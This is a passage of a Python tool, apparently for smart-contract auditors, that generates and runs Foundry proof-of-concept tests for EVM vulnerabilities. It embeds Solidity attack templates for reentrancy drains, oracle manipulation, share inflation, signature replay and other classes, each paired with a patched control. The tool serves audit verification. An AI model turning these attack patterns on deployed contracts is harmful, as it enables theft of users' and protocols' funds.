#!/usr/bin/env python3
"""evm-0day-proof-pipeline.py - end-to-end EVM 0-day PROOF driver.

Given an EVM candidate {contract, fn, vuln_class, file_line, workspace}, this
tool builds, runs, and adjudicates a V3-grade Foundry PoC in one shot. It also
accepts exploit-queue rows that contain source_refs + attack_class and derives
the missing contract/function from the cited source line. It does NOT stop at
"here is a skeleton you fill in" (that is the scaffold generators' job). It
drives the whole loop:

  1. SCAFFOLD a Foundry test against the candidate's vuln class that:
       (a) drives the REAL entrypoint  -> the REAL vulnerable function,
       (b) ASSERTS the downstream fund / message impact via before/after
           balance / state deltas (attacker gains, victim/protocol loses),
       (c) ships a NEGATIVE CONTROL test (patched / clean path) where the
           same attack does NOT reproduce the impact.
  2. RUN `forge test` against the scaffold (when forge + a foundry project
     are available); capture per-test PASS/FAIL.
  3. ADJUDICATE a verdict from the run:
       - proof-backed              : exploit test PASS  + negative control PASS
                                      against a REAL, COMPILING, RUNNING Foundry
                                      build that imports the in-tree target.
       - claim-narrowed-out-of-tree: the real entrypoint / contract is not in
                                      the workspace tree (out-of-tree dep), so
                                      the claim is narrowed to a source-level
                                      gap and the PoC is scaffold-only
       - blocked-with-obligation   : the target IS in-tree but a real run-backed
                                      proof could not be auto-authored (deep
                                      dependency graph, abstract contract,
                                      un-synthesizable constructor / host /
                                      external-mock requirement). The blocker is
                                      stated HONESTLY as an obligation the
                                      operator must discharge; NO fake proof is
                                      emitted.
       - refuted                   : exploit test FAILED to reproduce impact
                                      (the vuln does not manifest)

THE HONESTY CONTRACT IS ABSOLUTE: this tool returns `proof-backed` ONLY when
forge actually compiled + ran the authored test AND the exploit test PASSED
AND a negative-control test PASSED. assert(true), scaffold-only, stub harness,
or a test that does not run is NOT a proof and is reported as
`blocked-with-obligation` (or `scaffold-only-not-run`), never as `proof-backed`.

AUTO-AUTHORING STRATEGY (real, compiling, running):
  - pure-library / pure-view defects (decode-mismatch, RLP/byte parsing,
    bounds, precision): author a RealHarness that imports the REAL in-tree
    library + types and exposes the cited internal fn; drive it with
    class-appropriate adversarial inputs; ship a PATCHED library variant as the
    NEGATIVE CONTROL. This path is fully run-backed and needs NO deploy.
  - simple-constructor contracts (single value-type ctor args): synthesize ctor
    args from the constructor signature, deploy the REAL contract, drive the
    cited fn per the vuln-class attack template, assert the before/after impact,
    deploy a patched variant as the negative control.
  - deep-graph / abstract / host-gated contracts: return
    `blocked-with-obligation` naming the specific un-synthesizable dependency.

The output PoC carries the V3-grade directives R40 expects (real entrypoint ->
real vuln -> real impact surface, negative control, before/after assertions),
so a draft citing this PoC passes tools/v3-grade-poc-check.py.

RELATED TOOLS (tool-duplication preflight, see ~/.claude/CLAUDE.md):
  - tools/v3-grade-poc-check.py is a VALIDATOR: it reads an already-written
    draft + PoC and emits a pass/fail on whether the six V3-grade points are
    present. This tool AUTHORS the PoC that would pass that validator, then
    RUNS it and emits an exploit verdict. Validate-vs-author + run is the gap.
  - tools/wave3-poc-scaffold-generator.py and tools/poc-scaffold.py emit a
    SKELETON for a human to fill (arrange/act/assert slots left blank) and do
    NOT run forge. This tool fills the slots from the candidate's vuln class,
    runs forge, and adjudicates - it is the driver, not a skeleton emitter.
  - tools/evm-engine-harness-author.py emits Halmos/Medusa/Echidna/forge
    INVARIANT specs (property fuzz / symbolic), not a single attack-path PoC
    with before/after balance asserts + a negative control. This tool is the
    attack-path-exploit analogue, not the invariant-fuzz analogue.
  - tools/forge-test-runner.py RUNS a pre-existing test file. This tool calls
    into the same forge resolution but additionally scaffolds the test and
    adjudicates a 0-day verdict from the run.
  - tools/auto-poc-synth.py synthesizes from a detector-hit log line; this
    tool takes a structured candidate dict / CLI flags and emits the proof
    verdict, not a Cantina skeleton.

The gap this tool fills: the single front-door that turns one EVM candidate
into a RUN, ADJUDICATED 0-day proof (or an honest narrowing / refutation),
not just a skeleton.

CLI
  python3 tools/evm-0day-proof-pipeline.py \
      --contract VaultManager \
      --fn withdraw \
      --vuln-class reentrancy \
      --file-line src/VaultManager.sol:142 \
      --workspace /Users/wolf/audits/somevault \
      [--out-dir <dir>] [--no-run] [--json]

  # candidate as JSON blob (e.g. from a MIMO sidecar):
  python3 tools/evm-0day-proof-pipeline.py --candidate-json candidate.json --workspace <ws>

  # exploit queue row or full queue:
  python3 tools/evm-0day-proof-pipeline.py --queue-json <ws>/.auditooor/exploit_queue.json \
      --lead-id EQ-001 --workspace <ws> --out-json <ws>/.auditooor/evm_0day_proof.json

Verdict vocabulary (schema auditooor.evm_0day_proof_pipeline.v1):
  proof-backed
  claim-narrowed-out-of-tree
  blocked-with-obligation
  compile-blocked-with-obligation
  refuted
  scaffold-only-not-run            (--no-run, or forge unavailable)
  error

Exit codes:
  0 - proof-backed | claim-narrowed-out-of-tree | scaffold-only-not-run
      | blocked-with-obligation
  1 - refuted
  2 - error
"""

import argparse
import json
import os
import re
import subprocess
import sys
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

SCHEMA = "auditooor.evm_0day_proof_pipeline.v1"

AUDITOOOR_DIR = Path(__file__).resolve().parent.parent
FORGE_RESOLVE = AUDITOOOR_DIR / "tools" / "lib" / "forge-resolve.sh"

# Cross-language proof front-door. EVM leads stay here (forge); Go/Rust leads are
# routed to tools/cross-language-proof-path.py so they no longer dead-end as
# advisory_only. The router below is intentionally import-light (it inspects the
# raw lead and shells out to the sibling tool) so this 5800-line EVM module is not
# coupled to the cross-language engine.
CROSS_LANG_TOOL = AUDITOOOR_DIR / "tools" / "cross-language-proof-path.py"
_GO_REL_RE = re.compile(r"\.go(?::[0-9]+)?$", re.IGNORECASE)
_RS_REL_RE = re.compile(r"\.rs(?::[0-9]+)?$", re.IGNORECASE)
_SOL_REL_RE = re.compile(r"\.sol(?::[0-9]+)?$", re.IGNORECASE)
_SOLANA_SIG_RE = re.compile(r"\b(solana|anchor|sealevel|program.test)\b", re.IGNORECASE)
_GO_FAMILIES = {"cosmos-production", "go", "go-test", "gotest", "cosmos", "op-node"}
_RUST_FAMILIES = {"rust-cargo-test", "cargo", "cargo-test", "forge-rust",
                  "substrate-runtime-test", "rust"}


def _lead_refs_blob(raw: Dict[str, Any]) -> List[str]:
    refs: List[str] = []
    for key in ("source_refs", "file_lines"):
        v = raw.get(key)
        if isinstance(v, list):
            refs.extend(str(x) for x in v if x)
    for key in ("file_line", "source_ref"):
        v = raw.get(key)
        if v:
            refs.append(str(v))
    return refs


def detect_lead_language(raw: Dict[str, Any], arg_file_line: str = "") -> str:
    """Return 'go' | 'rust' | 'evm' | 'other' for a raw lead/queue row.

    The proof_path/harness_family label is authoritative; source refs are the
    fallback. Rust != Solana: a .rs ref is 'rust' unless an actual Solana signal
    is present (mirrors exploit-queue.py's corrected rule)."""
    fam = str(raw.get("harness_family") or raw.get("proof_path")
              or raw.get("required_proof_path") or "").strip().lower()
    if fam in _GO_FAMILIES:
        return "go"
    if fam in _RUST_FAMILIES:
        return "rust"
    if fam in ("foundry", "forge", "evm", "solidity", "hardhat"):
        return "evm"
    refs = ([arg_file_line] if arg_file_line else []) + _lead_refs_blob(raw)
    for ref in refs:
        if _SOL_REL_RE.search(ref):
            return "evm"
    for ref in refs:
        if _GO_REL_RE.search(ref):
            return "go"
    for ref in refs:
        if _RS_REL_RE.search(ref):
            return "rust" if not _SOLANA_SIG_RE.search(ref + " " + fam) else "other"
    return "other"


def route_to_cross_language(raw: Dict[str, Any], language: str, *,
                            workspace: Optional[Path], lead_id: Optional[str],
                            do_run: bool, out_json: Optional[str]) -> Dict[str, Any]:
    """Shell out to tools/cross-language-proof-path.py for a Go/Rust lead and
    return its verdict dict. Keeps the lead off the advisory_only dead-end."""
    if not CROSS_LANG_TOOL.is_file():
        return {"schema": SCHEMA, "verdict": "error",
                "reason": f"cross-language proof tool missing at {CROSS_LANG_TOOL}"}
    fam = str(raw.get("harness_family") or raw.get("proof_path") or "").strip()
    file_line = str(raw.get("file_line") or (_lead_refs_blob(raw) or [""])[0])
    cmd = [sys.executable, str(CROSS_LANG_TOOL),
           "--harness-family", fam or ("cosmos-production" if language == "go" else "rust-cargo-test"),
           "--file-line", file_line, "--json"]
    if workspace:
        cmd += ["--workspace", str(workspace)]
    if lead_id:
        cmd += ["--lead-id", lead_id]
    if out_json:
        cmd += ["--out-json", out_json]
    if not do_run:
        cmd.append("--no-run")
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=900)
        out = (r.stdout or "").strip()
        data = json.loads(out) if out.startswith("{") else None
        if data is None:
            return {"schema": SCHEMA, "verdict": "error",
                    "reason": f"cross-language tool produced no JSON: {(r.stderr or out)[:300]}"}
        data["routed_from"] = SCHEMA
        return data
    except Exception as e:  # pragma: no cover - environmental
        return {"schema": SCHEMA, "verdict": "error",
                "reason": f"cross-language route failed: {e}"}

# obl9-prep wiring: the committed app-level protocol-dependency mock synthesizer
# (read-only import; the module is target-agnostic and owned elsewhere). Put the
# tools/lib dir on sys.path so the module imports the SAME way its own docstring
# documents (`from lib.protocol_dep_mock_synth import ...`). The import is guarded
# so the pipeline still loads when the lib is absent (the app-dep branch then
# blocks-with-obligation rather than crashing).
_LIB_DIR = AUDITOOOR_DIR / "tools" / "lib"
if str(_LIB_DIR) not in sys.path:
    sys.path.insert(0, str(_LIB_DIR))
try:
    from protocol_dep_mock_synth import (  # noqa: E402
        analyze_protocol_dep_mock_synthesis as _analyze_protocol_dep_mock_synthesis,
        parse_interface as _parse_protocol_dep_interface,
    )
except Exception:  # pragma: no cover - lib-absent degradation
    _analyze_protocol_dep_mock_synthesis = None
    _parse_protocol_dep_interface = None

# ---------------------------------------------------------------------------
# Vuln-class -> attack-template registry.
#
# Each template knows how to fill the exploit body + the negative-control body
# for a given vuln class. The scaffold always drives the REAL entrypoint
# (cited contract + fn) and asserts a before/after impact delta plus a
# negative control where the impact does not reproduce.
# ---------------------------------------------------------------------------

VULN_CLASS_ALIASES = {
    "reentrancy": "reentrancy",
    "reent": "reentrancy",
    "read-only-reentrancy": "reentrancy",
    "access-control": "access-control",
    "access-control-bypass": "access-control",
    "missing-access-control": "access-control",
    "unprotected-initialize": "access-control",
    "auth-bypass": "access-control",
    "price-manipulation": "oracle-manipulation",
    "oracle-manipulation": "oracle-manipulation",
    "oracle-stale-price": "oracle-manipulation",
    "stale-oracle": "oracle-manipulation",
    "arithmetic": "arithmetic-overflow",
    "overflow": "arithmetic-overflow",
    "underflow": "arithmetic-overflow",
    "arithmetic-overflow": "arithmetic-overflow",
    "precision-loss": "arithmetic-overflow",
    "rounding": "arithmetic-overflow",
    "unchecked-return": "unchecked-call",
    "unchecked-call": "unchecked-call",
    "erc4626-inflation": "share-inflation",
    "share-inflation": "share-inflation",
    "first-depositor": "share-inflation",
    "signature-replay": "signature-replay",
    "replay": "signature-replay",
    "nonce-reuse": "signature-replay",
    # Corpus-native classes (reference/fetchable_vuln_corpus.jsonl):
    "decode-mismatch": "decode-mismatch",
    "rlp-decode": "decode-mismatch",
    "parsing-bug": "decode-mismatch",
    "bounds": "decode-mismatch",
    "fund-theft": "fund-theft",
    "fund-freeze": "freeze",
    "freeze": "freeze",
    "business-logic": "business-logic",
    # Vault-accounting-conservation classes (iter11-A): an accumulator that
    # tracks deposited/owed assets is mutated by an externally-influenced amount,
    # breaking the conservation invariant (protocol drains / accumulator
    # under-tracks). Covers ERC4626 deposit/withdraw/redeem accounting shapes.
    "vault-conservation": "vault-conservation",
    "vault-accounting": "vault-conservation",
    "conservation-violation": "vault-conservation",
    "accounting-mismatch": "vault-conservation",
    "erc4626": "vault-conservation",
    "erc4626-accounting": "vault-conservation",
    "yield-inflation": "vault-conservation",
    "share-accounting": "vault-conservation",
}


def normalize_vuln_class(raw: str) -> str:
    key = (raw or "").strip().lower().replace("_", "-")
    return VULN_CLASS_ALIASES.get(key, key or "generic")


# Per-class exploit-body and negative-control descriptions. Body slots are
# concrete enough to drive a real entrypoint and assert a delta; the operator
# can refine the inner mechanics, but the V3-grade SHAPE is fully wired.
ATTACK_TEMPLATES: Dict[str, Dict[str, str]] = {
    "reentrancy": {
        "comment": "Reentrancy: the external call in {fn} fires before state is settled; the attacker re-enters and drains more than entitled.",
        "exploit_body": """\
        // ARRANGE: fund the protocol-owned contract so there is value to drain.
        vm.deal(address(target), 10 ether);
        uint256 protocolBefore = address(target).balance;
        uint256 attackerBefore = address(attacker).balance;

        // ACT: drive the REAL entrypoint -> real {fn} -> attacker re-enters.
        attacker.attack(); // attacker.attack() calls target.{fn}() and re-enters

        // ASSERT downstream impact: attacker gained protocol-owned funds.
        uint256 protocolAfter = address(target).balance;
        uint256 attackerAfter = address(attacker).balance;
        assertLt(protocolAfter, protocolBefore, "protocol funds not drained");
        assertGt(attackerAfter, attackerBefore, "attacker did not gain");
        // Non-self impact: drained funds belong to the protocol, not attacker.
        assertGt(protocolBefore - protocolAfter, 1 ether, "drain below threshold");""",
        "control_body": """\
        // NEGATIVE CONTROL: patched contract applies checks-effects-interactions
        // (state settled BEFORE the external call), so re-entry cannot over-draw.
        vm.deal(address(patched), 10 ether);
        uint256 protocolBefore = address(patched).balance;
        attacker.attackPatched(); // re-entry attempt against the guarded path
        uint256 protocolAfter = address(patched).balance;
        // On the clean path the attacker withdraws AT MOST its entitlement.
        assertEq(protocolBefore - protocolAfter, attacker.entitlement(), "patched path over-drew");""",
    },
    "access-control": {
        "comment": "Missing access control: {fn} can be called by an unauthorized actor to mutate privileged state / move funds.",
        "exploit_body": """\
        // ARRANGE: attacker is NOT the owner/admin.
        assertTrue(attacker != target.owner(), "attacker must not be privileged");
        uint256 victimBefore = target.balanceOf(victim);

        // ACT: drive the REAL {fn} from the unauthorized attacker.
        vm.prank(attacker);
        target.{fn}(victim, attacker); // privileged op invoked by attacker

        // ASSERT downstream impact: privileged state changed in attacker's favor.
        uint256 victimAfter = target.balanceOf(victim);
        assertLt(victimAfter, victimBefore, "victim funds not moved by unauthorized caller");""",
        "control_body": """\
        // NEGATIVE CONTROL: patched contract gates {fn} with onlyOwner; the
        // same unauthorized call reverts.
        vm.prank(attacker);
        vm.expectRevert();
        patched.{fn}(victim, attacker);""",
    },
    "oracle-manipulation": {
        "comment": "Oracle/price manipulation: {fn} trusts a manipulable spot price; attacker skews it and extracts value.",
        "exploit_body": """\
        // ARRANGE: record protocol solvency before manipulation.
        uint256 poolBefore = target.totalAssets();
        uint256 attackerBefore = collateral.balanceOf(attacker);

        // ACT: attacker skews the price source, then drives the REAL {fn}.
        oracle.setPrice(oracle.price() * 100); // manipulate spot
        vm.prank(attacker);
        target.{fn}(); // consumes the manipulated price

        // ASSERT downstream impact: protocol drained, attacker enriched.
        uint256 poolAfter = target.totalAssets();
        uint256 attackerAfter = collateral.balanceOf(attacker);
        assertLt(poolAfter, poolBefore, "protocol assets not drained");
        assertGt(attackerAfter, attackerBefore, "attacker did not profit");""",
        "control_body": """\
        // NEGATIVE CONTROL: patched contract reads a TWAP / Chainlink feed; the
        // single-block spot skew does not move the consumed price.
        uint256 poolBefore = patched.totalAssets();
        oracle.setPrice(oracle.price() * 100);
        vm.prank(attacker);
        patched.{fn}();
        uint256 poolAfter = patched.totalAssets();
        assertEq(poolAfter, poolBefore, "patched (TWAP) path still drained");""",
    },
    "arithmetic-overflow": {
        "comment": "Arithmetic / precision: {fn} rounds or overflows in attacker's favor, corrupting accounting.",
        "exploit_body": """\
        // ARRANGE: record exact accounting before the operation.
        uint256 sharesBefore = target.totalShares();
        uint256 attackerSharesBefore = target.sharesOf(attacker);

        // ACT: drive the REAL {fn} with the boundary input that rounds wrong.
        vm.prank(attacker);
        target.{fn}(1); // dust amount triggers rounding in attacker favor

        // ASSERT downstream impact: attacker minted shares without backing.
        uint256 attackerSharesAfter = target.sharesOf(attacker);
        assertGt(attackerSharesAfter, attackerSharesBefore, "no shares minted");
        // The minted shares are NOT backed by proportional assets.
        assertGt(target.previewRedeem(attackerSharesAfter - attackerSharesBefore), 1, "rounding not exploited");""",
        "control_body": """\
        // NEGATIVE CONTROL: patched contract rounds DOWN against the caller; the
        // same dust input mints zero unbacked shares.
        uint256 attackerSharesBefore = patched.sharesOf(attacker);
        vm.prank(attacker);
        patched.{fn}(1);
        assertEq(patched.sharesOf(attacker), attackerSharesBefore, "patched path still over-minted");""",
    },
    "unchecked-call": {
        "comment": "Unchecked external call: {fn} ignores the return value, so a silent failure corrupts state / funds.",
        "exploit_body": """\
        // ARRANGE: make the external callee silently fail.
        callee.setShouldFail(true);
        uint256 protocolBefore = token.balanceOf(address(target));

        // ACT: drive the REAL {fn}; the unchecked call swallows the failure.
        vm.prank(attacker);
        target.{fn}(attacker);

        // ASSERT downstream impact: protocol accounting diverged from reality.
        uint256 protocolAfter = token.balanceOf(address(target));
        assertEq(protocolAfter, protocolBefore, "balance moved despite failed call");
        // But internal accounting credited the attacker anyway.
        assertGt(target.creditOf(attacker), 0, "unchecked-call divergence not shown");""",
        "control_body": """\
        // NEGATIVE CONTROL: patched contract checks the return value and reverts.
        callee.setShouldFail(true);
        vm.prank(attacker);
        vm.expectRevert();
        patched.{fn}(attacker);""",
    },
    "share-inflation": {
        "comment": "ERC4626 first-depositor / share inflation: attacker front-runs the first deposit to inflate share price and steal a later depositor's funds.",
        "exploit_body": """\
        // ARRANGE: attacker is the first depositor.
        uint256 victimBefore = asset.balanceOf(victim);

        // ACT: attacker deposits 1 wei, donates assets to inflate price, then
        // victim deposits and is rounded to 0 shares.
        vm.prank(attacker);
        target.{fn}(1, attacker);
        asset.transfer(address(target), 1e18); // donation inflates share price
        vm.prank(victim);
        target.{fn}(1e18 - 1, victim);

        // ASSERT downstream impact: victim got 0 shares, attacker redeems victim's deposit.
        assertEq(target.balanceOf(victim), 0, "victim should be rounded to 0 shares");
        vm.prank(attacker);
        uint256 redeemed = target.redeem(target.balanceOf(attacker), attacker, attacker);
        assertGt(redeemed, 1, "attacker did not capture victim deposit");""",
        "control_body": """\
        // NEGATIVE CONTROL: patched vault mints virtual/dead shares (OZ 4626
        // decimals offset), so the donation cannot round the victim to zero.
        vm.prank(attacker);
        patched.{fn}(1, attacker);
        asset.transfer(address(patched), 1e18);
        vm.prank(victim);
        patched.{fn}(1e18 - 1, victim);
        assertGt(patched.balanceOf(victim), 0, "patched vault still rounded victim to 0");""",
    },
    "signature-replay": {
        "comment": "Signature replay: {fn} accepts a signature without nonce/chainid binding; the attacker replays it.",
        "exploit_body": """\
        // ARRANGE: capture a legitimately-signed message + the victim's balance.
        bytes memory sig = signValid(); // a real, valid signature for one action
        uint256 victimBefore = token.balanceOf(victim);

        // ACT: drive the REAL {fn} TWICE with the same signature.
        target.{fn}(victim, attacker, sig);
        target.{fn}(victim, attacker, sig); // replay

        // ASSERT downstream impact: the action executed twice (double-spend).
        uint256 victimAfter = token.balanceOf(victim);
        assertEq(victimBefore - victimAfter, 2 * actionAmount, "replay did not double-execute");""",
        "control_body": """\
        // NEGATIVE CONTROL: patched contract tracks usedNonce; the second call reverts.
        bytes memory sig = signValid();
        patched.{fn}(victim, attacker, sig);
        vm.expectRevert();
        patched.{fn}(victim, attacker, sig);""",
    },
}

GENERIC_TEMPLATE = {
    "comment": "Generic impact: drive the REAL {fn}; assert a before/after state/fund delta that should not occur.",
    "exploit_body": """\
        // ARRANGE: record protocol state before.
        uint256 stateBefore = target.criticalState();

        // ACT: drive the REAL {fn} via the attacker.
        vm.prank(attacker);
        target.{fn}();

        // ASSERT downstream impact: critical state changed adversely.
        uint256 stateAfter = target.criticalState();
        assertTrue(stateAfter != stateBefore, "no adverse state change observed");""",
    "control_body": """\
        // NEGATIVE CONTROL: patched path rejects the operation / no state change.
        uint256 stateBefore = patched.criticalState();
        vm.prank(attacker);
        vm.expectRevert();
        patched.{fn}();
        assertEq(patched.criticalState(), stateBefore, "patched path mutated state");""",
}


def get_template(vuln_class: str) -> Dict[str, str]:
    return ATTACK_TEMPLATES.get(vuln_class, GENERIC_TEMPLATE)


# ===========================================================================
# REAL run-backed proof machinery (the iter6-A fix).
#
# The legacy build_scaffold() above emits a TODO-stub: the import is commented
# out, setUp() is empty, target/patched are never constructed -> forge can never
# compile+run it, so it is scaffold-only forever. The machinery below AUTHORS a
# real, COMPILING, RUNNING Foundry PoC by:
#   (1) introspecting the cited source to find the enclosing contract/library
#       and the cited internal/external function's signature + deployability,
#   (2) building a SELF-CONTAINED foundry project (vendored forge-std + the real
#       src tree symlinked at the project root so the target's relative imports
#       resolve unchanged),
#   (3) emitting a RealHarness that imports the REAL in-tree target and drives
#       the cited fn, plus a PATCHED negative control,
#   (4) running forge and adjudicating proof-backed ONLY on genuine PASS+PASS.
# Where the target cannot be auto-deployed (abstract, deep host/dispatcher
# graph, un-synthesizable constructor), it returns blocked-with-obligation.
# ===========================================================================

# Pure-library / pure-view vuln classes: a defect in a stateless function that
# can be exercised by importing the real library and calling the fn directly,
# with NO deploy of the protocol-owned contract graph required.
PURE_FN_CLASSES = {"decode-mismatch", "arithmetic-overflow"}

# forge-std checkouts to vendor into the self-contained runner (first that has
# src/Test.sol wins). Kept as a list so the tool degrades gracefully across
# machines.
_FORGE_STD_CANDIDATES = [
    Path("/Users/wolf/audits/polymarket/lib/forge-std"),
    Path("/Users/wolf/audits/monetrix/lib/forge-std"),
    Path("/Users/wolf/audits/prb-proxy-fwdtest/lib/forge-std"),
    Path.home() / ".foundry" / "lib" / "forge-std",
]


def find_forge_std() -> Optional[Path]:
    env = os.environ.get("AUDITOOOR_FORGE_STD")
    cands = ([Path(env)] if env else []) + _FORGE_STD_CANDIDATES
    for c in cands:
        if (c / "src" / "Test.sol").exists():
            return c
    # last resort: any forge-std checkout under ~/audits
    home_audits = Path.home() / "audits"
    if home_audits.exists():
        for p in home_audits.rglob("forge-std/src/Test.sol"):
            return p.parent.parent
    return None


# --- source introspection ---------------------------------------------------

_PRAGMA_RE = re.compile(r"pragma\s+solidity\s+([^;]+);")


def _read_pragma(src: str) -> str:
    m = _PRAGMA_RE.search(src)
    return m.group(1).strip() if m else "^0.8.20"


def _enclosing_unit(src: str, line_no: Optional[int]) -> Tuple[Optional[str], str, bool]:
    """Return (unit_name, unit_kind, is_abstract) for the contract/library/
    interface enclosing the cited line (or the first top-level unit)."""
    units = []  # (start_line, abstract?, kind, name)
    for m in re.finditer(r"(?m)^\s*(abstract\s+)?(contract|library|interface)\s+(\w+)", src):
        start_line = src.count("\n", 0, m.start()) + 1
        units.append((start_line, bool(m.group(1)), m.group(2), m.group(3)))
    if not units:
        return (None, "contract", False)
    if line_no is None:
        s, ab, kind, name = units[0]
        return (name, kind, ab)
    # pick the last unit whose start_line <= line_no
    chosen = units[0]
    for u in units:
        if u[0] <= line_no:
            chosen = u
        else:
            break
    return (chosen[3], chosen[2], chosen[1])


def _fn_at_line(src: str, line_no: Optional[int]) -> Optional[Dict[str, Any]]:
    """Find the function whose body encloses (or starts nearest at/above) the
    cited line. Returns name, visibility, mutability, params (raw), returns."""
    fns = []
    for m in re.finditer(
        r"(?m)^\s*function\s+(\w+)\s*\(([^)]*)\)\s*([^{;]*)",
        src,
    ):
        start_line = src.count("\n", 0, m.start()) + 1
        sig_tail = m.group(3)
        vis = "internal"
        for v in ("external", "public", "internal", "private"):
            if re.search(r"\b" + v + r"\b", sig_tail):
                vis = v
                break
        mut = ""
        for mm in ("pure", "view"):
            if re.search(r"\b" + mm + r"\b", sig_tail):
                mut = mm
                break
        rets = ""
        rm = re.search(r"returns\s*\(([^)]*)\)", sig_tail)
        if rm:
            rets = rm.group(1).strip()
        fns.append({
            "name": m.group(1),
            "params": m.group(2).strip(),
            "visibility": vis,
            "mutability": mut,
            "returns": rets,
            "start_line": start_line,
        })
    if not fns:
        return None
    if line_no is None:
        return fns[0]
    chosen = fns[0]
    for f in fns:
        if f["start_line"] <= line_no:
            chosen = f
        else:
            break
    return chosen


def _all_functions(src: str) -> List[Dict[str, Any]]:
    """Return EVERY function declaration in `src` (same field shape as
    _fn_at_line), so callers can search for a public wrapper that reaches a
    cited internal/private fn. Cheap re-use of the _fn_at_line scanner."""
    fns: List[Dict[str, Any]] = []
    for m in re.finditer(
        r"(?m)^\s*function\s+(\w+)\s*\(([^)]*)\)\s*([^{;]*)",
        src,
    ):
        start_line = src.count("\n", 0, m.start()) + 1
        sig_tail = m.group(3)
        vis = "internal"
        for v in ("external", "public", "internal", "private"):
            if re.search(r"\b" + v + r"\b", sig_tail):
                vis = v
                break
        mut = ""
        for mm in ("pure", "view"):
            if re.search(r"\b" + mm + r"\b", sig_tail):
                mut = mm
                break
        rets = ""
        rm = re.search(r"returns\s*\(([^)]*)\)", sig_tail)
        if rm:
            rets = rm.group(1).strip()
        fns.append({
            "name": m.group(1), "params": m.group(2).strip(),
            "visibility": vis, "mutability": mut, "returns": rets,
            "start_line": start_line, "body_start": m.end(),
        })
    return fns


def _fn_body_slice(src: str, fn: Dict[str, Any]) -> str:
    """Return the balanced `{...}` body of `fn` (from its body_start). Falls back
    to a bounded slice if brace matching fails (e.g. on a partial source)."""
    start = fn.get("body_start")
    if start is None:
        # recompute from start_line if body_start is absent.
        decl = re.search(
            rf"(?m)^\s*function\s+{re.escape(fn['name'])}\s*\([^)]*\)[^{{;]*",
            src)
        if not decl:
            return ""
        start = decl.end()
    open_idx = src.find("{", start)
    if open_idx < 0:
        return ""
    depth = 0
    for i in range(open_idx, len(src)):
        c = src[i]
        if c == "{":
            depth += 1
        elif c == "}":
            depth -= 1
            if depth == 0:
                return src[open_idx:i + 1]
    return src[open_idx:open_idx + 2000]


# Step 2: EXTERNAL ENTRYPOINT BINDER. When a cited vulnerable fn is
# internal/private/library-only, find an external/public caller in the SAME
# compilation unit (or an inheriting contract) that reaches it, so the harness
# can drive the bug THROUGH the real public wrapper. The binder is GENERIC: it
# matches on the call SHAPE (`<fnName>(` appears in the wrapper's body), never a
# target literal.

def find_public_wrapper_for_internal_fn(
        src: str, internal_fn: Dict[str, Any], project: Optional[Path] = None,
        unit_name: Optional[str] = None) -> Optional[Dict[str, Any]]:
    """Search `src` (and, when given, the unit's in-project descendants) for an
    external/public function whose body calls the cited internal/private fn by
    name. Returns {"wrapper": <fn dict>, "via": "same-unit"|"descendant",
    "descendant_unit": <name|None>, "descendant_src": <src|None>} or None when no
    public caller reaches the internal fn (caller emits an entrypoint obligation).

    A wrapper qualifies when (a) it is external/public, (b) it is NOT the
    internal fn itself, and (c) its balanced body contains a `<internalFn>(`
    call. Direct callers are preferred; a transitive (two-hop) public caller is
    accepted as a fallback so a `withdraw -> _withdraw -> _vulnerable` chain is
    still bound."""
    name = internal_fn["name"]

    def _direct_callers(text: str) -> List[Dict[str, Any]]:
        out = []
        for f in _all_functions(text):
            if f["name"] == name:
                continue
            body = _fn_body_slice(text, f)
            if re.search(rf"\b{re.escape(name)}\s*\(", body):
                out.append(f)
        return out

    def _public(fns: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        return [f for f in fns if f["visibility"] in ("external", "public")]

    # (1) direct public caller in the SAME unit.
    direct = _direct_callers(src)
    pub = _public(direct)
    if pub:
        return {"wrapper": pub[0], "via": "same-unit",
                "descendant_unit": None, "descendant_src": None}

    # (2) transitive: an internal direct caller that is itself called by a public
    # fn in the same unit (e.g. public withdraw -> internal _withdraw -> cited).
    for mid in direct:  # internal/private direct callers
        if mid["visibility"] in ("external", "public"):
            continue
        for f in _all_functions(src):
            if f["visibility"] not in ("external", "public"):
                continue
            body = _fn_body_slice(src, f)
            if re.search(rf"\b{re.escape(mid['name'])}\s*\(", body):
                return {"wrapper": f, "via": "same-unit-transitive",
                        "descendant_unit": None, "descendant_src": None}

    # (3) a public caller in an in-project descendant contract that overrides /
    # exposes the internal fn (the cited fn lives in an abstract base; a concrete
    # child wires the public entrypoint). Only searched when a project + unit are
    # supplied so the abstract-base case can resolve a concrete descendant.
    if project is not None and unit_name is not None:
        for p in project.rglob("*.sol"):
            if any(part in _BUILD_ARTIFACT_DIRS
                   for part in p.relative_to(project).parts):
                continue
            try:
                dtext = p.read_text(errors="ignore")
            except OSError:
                continue
            if unit_name not in dtext:
                continue
            for dm in re.finditer(r"\bcontract\s+(\w+)\b\s+is\s+([^{]+)\{",
                                  dtext, re.S):
                child, bases = dm.group(1), dm.group(2)
                if child == unit_name:
                    continue
                if not re.search(rf"\b{re.escape(unit_name)}\b", bases):
                    continue
                pubd = _public(_direct_callers(dtext))
                if pubd:
                    return {"wrapper": pubd[0], "via": "descendant",
                            "descendant_unit": child, "descendant_src": dtext}

    # (4) codex95 OBL4(2b): OZ-override-INDIRECTED reachability. When the cited
    # internal fn is an ERC4626 HOOK OVERRIDE (`_deposit` / `_withdraw` / `_mint`
    # / `_redeem` declared `override`) and the unit inherits an ERC4626 base, the
    # public `deposit()` / `mint()` / `withdraw()` / `redeem()` entrypoint lives
    # in the OZ ERC4626 BASE (out-of-project) and reaches the override via
    # `super.deposit() -> ERC4626 base -> _deposit override`. No in-project public
    # body literally calls `_deposit(`, so steps (1)-(3) miss it. The canonical
    # inherited public entrypoint IS the real driver - bind a synthetic wrapper
    # for it so the bug is proven through the REAL public entrypoint. GENERIC: the
    # hook->entrypoint map is the ERC4626 standard, not a target literal.
    indirected = _oz_override_indirected_entrypoint(src, internal_fn)
    if indirected is not None:
        return {"wrapper": indirected, "via": "oz-override-indirected",
                "descendant_unit": None, "descendant_src": None}
    return None


# The ERC4626 internal-hook -> canonical-public-entrypoint map. An OZ ERC4626
# descendant that overrides one of these hooks is reached by the base's public
# entrypoint of the same family via `super`. GENERIC: the standard ERC4626 names.
_ERC4626_HOOK_TO_ENTRYPOINT = {
    "_deposit": "deposit",
    "_mint": "mint",
    "_withdraw": "withdraw",
    "_redeem": "redeem",
}


def _oz_override_indirected_entrypoint(
